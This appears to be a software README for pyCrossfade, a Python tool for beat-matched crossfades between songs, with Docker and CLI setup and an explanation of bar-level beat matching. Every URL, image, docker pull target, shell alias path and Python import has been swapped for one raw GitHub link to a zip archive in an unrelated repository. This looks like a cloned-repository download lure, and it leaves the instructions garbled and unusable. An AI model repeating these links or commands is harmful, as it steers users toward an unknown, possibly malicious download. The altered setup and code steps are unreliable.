# pyCrossfade

![pyCrossfade Logo](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip)

pyCrossfade is born out of a personal effort to create a customizable and beat-matched crossfade functionality.

December 2024: ✨added CLI and Docker image✨

---

## CLI

Since the creation of this project, Python3 and dependencies got updated and stopped working with the pyCrossfade codebase.

### Docker Image

I've created a [Docker Image on https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip) to help users getting the correct dependecy versions.

```bash
docker pull https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip
```

### CLI Setup (for Linux)

To use the Docker image as a CLI, you'd need to:

- attach your `audios/` directory to the container
- attach a directory for persisting _pyCrossfade annotations_
- set some Env Vars for easier use.

This can be long and ugly, so the best thing to do is create a `alias` command.

Change the `MY_AUDIO_DIRECTORY` and add the following bash snippet to your `.bashrc` :

```bash
PYCROSSFADE_DIR="$https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip"
PYCROSSFADE_ANNOTATIONS_DIR="$PYCROSSFADE_DIR/annotations"

MY_AUDIO_DIRECTORY="!!CHANGEME!!"

# create the alias command
alias pycrossfade="mkdir -p $PYCROSSFADE_DIR \
  && mkdir -p $PYCROSSFADE_ANNOTATIONS_DIR \
  && docker run --rm -it \
      -v "$MY_AUDIO_DIRECTORY:/app/audios" \
      -v $PYCROSSFADE_ANNOTATIONS_DIR:/app/pycrossfade_annotations \
      -e ANNOTATIONS_DIRECTORY=/app/pycrossfade_annotations \
      -e BASE_AUDIO_DIRECTORY=/app/audios/ \
      https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip"
```

### CLI Usage

```bash
pycrossfade
```

![pycrossfade CLI help page](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip)

```bash
pycrossfade crossfade --help
```

![pycrossfade CLI crossfade command help page](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip)

#### CLI Commands

- `crossfade`: Crossfade between two songs
- `crossfade-many`: Crossfade between min. of 3 songs
- `song`: Process song and print metadata
- `extract`: Extract BPM, ReplayGain, Key/Scale etc.
- `mark-downbeats`: Play a beep sound on each downbeat
- `cut-song`: Cut a song between two downbeats

---

## Older pyCrossfade

Before I added the CLI and Docker feature, I created the v0.1.0 tag. Access below:

- <https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip>
- Older [Scripted Usage](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip) documentation

---

## About This Project

This project's main goal is to create seamless crossfade transitions between music files. This requires some DJ'ing abilities such as _bpm changing_, _beat-matching_ and _equalizer manipulation_.

#### Some Definitions on Music Domain

- [Beat](<https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip(music)>)
  In music and music theory, the beat is the basic unit of time, the pulse or regularly repeating event.
  The beat is often defined as the rhythm listeners would tap their toes to when listening to a piece of music.

- [Bar (Measure)](<https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip(music)>)
  In musical notation, a bar (or measure) is a segment of time corresponding to a specific number of beats, usually 4.

- [Downbeat](<https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip(music)#Downbeat_and_upbeat>)
  The downbeat is the first beat of the bar, i.e. number 1.

### About Madmom's Beat Tracking

Madmom's Beat Tracking takes a long time to run, 45-150 seconds depending on the music file. It gives a `numpy array` as output, so when madmom finishes calculating, pyCrossfade saves/caches the said `numpy array` in a text file named after the song, under the folder `pycrossfade_annotations`. This makes pyCrossfade robust while working with same songs by avoiding heavy calculations every time.

### BPM Matching

The creation of a transition requires two songs, called master and slave songs. Master song is the currently playing track and slave song refers to the next track.

Master and slave tracks can be in different BPM's or speeds, so before applying crossfade, we have to gradually increase/decrease to master track's speed to match slave's speed. Let's say master song has 90 bpm, and slave song has 135 bpm. This makes slave song 1.5x faster than master song. If we were to suddenly increase the speed 1.5x that would be harsh on the listeners ear.

#### Gradually Time Stretching On Downbeats

Before applying crossfade, to match the bpm's of two songs, master song's speed is gradually increased on given number of downbeats. This ensures the listening experience quality. This works linearly as can be seen in the table below.

##### Example

```python
from https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip import crop_audio_and_dbeats \
                                   time_stretch_gradually_in_downbeats

from https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip import Song
from https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip import save_audio

my_song = Song('https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip')

final_factor =  1.10 # times faster

# returns a new Song obj. cropped from my_song's between given parameter downbeats(or bars).
sample = crop_audio_and_dbeats(my_song, 50, 60) # sample of 10 bars

# increases the sample song's speed gradually
sample_but_faster_every_beat = time_stretch_gradually_in_downbeats(sample, final_factor)

save_audio(sample_but_faster_every_beat, 'https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip', file_format='wav', bit_rate=320)
```

| bars                     | 1     | 2     | 3     | 4     | 5     | 6     | 7     | 8     | 9     | 10    | Final Factor |
| ------------------------ | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ------------ |
| _Time Stretching Factor_ | 1.01x | 1.02x | 1.03x | 1.04x | 1.05x | 1.06x | 1.07x | 1.08x | 1.09x | 1.10x | _1.10x_      |

### Overview of the Transition

A simple visualization of all the processes would be like this:

> _master song_ | _bpm matching_ | _crossfade_ | _slave song_

> ı||ı|ı||||ı||ı||||ı|||ı||ı||ı||ı||ıı||ı||ı|ıı||ı|ıı||ııııııııııııııııııı

> --------------------------------ııııııııııııııııııı||ı||ııı|||ı||ııı|||ı||ııı|ıı||||ıı

### pyCrossfade's Approach To Perfect Beat Matching

Human ear can catch minimal errors easily thus making beat-matching is extremely important for any transition. Beat-matching would be easy if every beat had regular timing, but producers are doing their best to [humanize their songs](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip), not playing every beat in regular timing to get nonrobotic rhythms.

#### A Visual Explanation

Here, I cut two songs between their 30th and 50th downbeats, resulting in the same amount of downbeats.
![https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip Downbeats](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip)

Red lines are denoting every _bar_, or it's delimiter _downbeats_.

![https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip Downbeats](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip)

This is the second song with 20 bars.

![https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip and  Downbeats](https://raw.githubusercontent.com/lilago/Xfayd/master/docs/Software_v3.2-beta.5.zip)

> First song's waveform is blue and it's bars denoted with red lines. Second song is shown with colors of orange and green.

When we put them on top of each other, we can see that their beats(red and green lines) is not matched, resulting in clashing of drums - or distorted audio.

Even though they have same amount of bars, resulting plot shows that second song is shorter. This is beacuse they have different BPMs - or speeds.

If every song had regular beat timing, then beat-matching would be easy as just time stretching the other song to match their speeds. However, because of _humanizing_, every bar can be different in length. For this reason, pyCrossfade applies beat matching on the level of bars.

##### Beat Matching on the level of every bar

pyCrossfade lets you define every transition's length in bars, lets take it as _K_ bars. Then it gets _master song_'s last K bars, and _slave song_'s first K bars, and applies beat matching on each bar. This is ensures the created transition is perfectly beat-matched even if the songs are _humanized_ or not.

### Possible Improvements

- Better(maybe Non-Linear) EQ Filtering
- Volume Balancing with Replay Gain
- Developing a better Crossfade EQ Filtering
